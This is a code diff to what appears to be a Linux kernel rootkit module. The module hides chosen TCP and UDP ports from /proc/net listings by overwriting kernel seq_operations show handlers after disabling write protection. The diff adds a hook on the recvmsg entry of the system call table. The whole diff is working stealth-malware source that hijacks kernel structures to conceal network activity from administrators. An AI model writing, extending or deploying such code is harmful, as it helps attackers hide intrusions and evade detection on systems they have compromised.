@@ -16,6 +16,7 @@ port_list_t hidden_ports = {
 
 port_list_t_ptr hidden_ports_tail = &hidden_ports;
 
+static asmlinkage ssize_t (*sys_recvmsg)(int, struct user_msghdr __user *, unsigned);
 
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
@@ -30,49 +31,63 @@ static int g7_udp6_seq_show(struct seq_file *, void *);
 void
 hide_sockets(void)
 {
-    tcp4_seq_show
-        = ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show;
+    if (!sys_recvmsg) {
+        sys_recvmsg = (void *)sys_calls[__NR_recvmsg];
 
-    tcp6_seq_show
-        = ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show;
+        tcp4_seq_show
+            = ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show;
 
-    udp4_seq_show
-        = ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show;
+        tcp6_seq_show
+            = ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show;
 
-    udp6_seq_show
-        = ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show;
+        udp4_seq_show
+            = ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show;
 
-    disable_protection();
-    ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
-        = (void *)g7_tcp4_seq_show;
+        udp6_seq_show
+            = ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show;
 
-    ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
-        = (void *)g7_tcp6_seq_show;
+        disable_protection();
 
-    ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
-        = (void *)g7_udp4_seq_show;
+        sys_calls[__NR_recvmsg] = (void *)g7_recvmsg;
 
-    ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
-        = (void *)g7_udp6_seq_show;
-    enable_protection();
+        ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
+            = (void *)g7_tcp4_seq_show;
+
+        ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
+            = (void *)g7_tcp6_seq_show;
+
+        ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
+            = (void *)g7_udp4_seq_show;
+
+        ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
+            = (void *)g7_udp6_seq_show;
+
+        enable_protection();
+    }
 }
 
 void
 unhide_sockets(void)
 {
-    disable_protection();
-    ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
-        = (void *)tcp4_seq_show;
+    if (sys_recvmsg) {
+        disable_protection();
+        sys_calls[__NR_recvmsg] = (void *)sys_recvmsg;
 
-    ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
-        = (void *)tcp6_seq_show;
+        ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
+           = (void *)tcp4_seq_show;
 
-    ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
-        = (void *)udp4_seq_show;
+        ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
+           = (void *)tcp6_seq_show;
 
-    ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
-        = (void *)udp6_seq_show;
-    enable_protection();
+        ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
+           = (void *)udp4_seq_show;
+
+        ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
+           = (void *)udp6_seq_show;
+
+        enable_protection();
+        sys_recvmsg = NULL;
+    }
 }
 
 void
@@ -145,6 +160,11 @@ remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
     return ret;
 }
 
+asmlinkage ssize_t
+g7_recvmsg(int fd, struct user_msghdr __user *msg, unsigned flags)
+{
+    return sys_recvmsg(fd, msg, flags);
+}
 
 //seq and v include all the info we need
 //https://elixir.bootlin.com/linux/v4.19/source/include/linux/seq_file.h#L16
@@ -221,7 +241,7 @@ g7_udp6_seq_show(struct seq_file *seq, void *v)
     port_t src = ntohs(inet->inet_sport);
     port_t dst = ntohs(inet->inet_dport);
 
-   if(list_contains_port(&hidden_ports, src, udp6)
+    if(list_contains_port(&hidden_ports, src, udp6)
     || list_contains_port(&hidden_ports, dst, udp6))
         return 0;
 
